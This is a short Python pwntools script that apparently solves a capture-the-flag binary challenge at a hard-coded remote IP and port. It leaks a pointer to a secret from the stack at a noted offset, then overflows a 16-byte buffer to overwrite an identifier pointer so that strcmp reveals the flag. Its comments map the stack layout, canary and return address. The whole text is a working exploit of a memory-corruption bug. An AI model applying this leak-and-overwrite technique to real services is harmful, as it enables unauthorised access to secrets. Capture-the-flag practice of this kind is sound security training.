from pwn import *

# Setup connection to servlet
ip = "158.37.65.130"
port = 7004
io = remote(ip, port)

# Read initial messages
print(io.readline(timeout=.5))
print(io.readline(timeout=.5))

# -4 | offset
#  0 | Buffer
#  8 | Buffer
# 16 | Pointer
# 24 | Canary
# 32 |
# 40 | Return address to main
# 48 | *Secret

# Read where secret is pointing
offset_to_secret = 48
io.sendline(str(offset_to_secret))

# skip text
io.readline(timeout=.5)
# Get value of the pointer to secret
pointer_to_secret = int(io.readline(timeout=.5), 16)
print(hex(pointer_to_secret))

# skip text
io.readline(timeout=.5)

# Fill buffer (cyclic(16))
# overwrite pointer towards identifier with pointer towards secret
io.sendline(cyclic(16)+p64(pointer_to_secret))

# Now strcmp will compare the value of secret itself, thus printing the flag.
print(io.readall(timeout=.5))
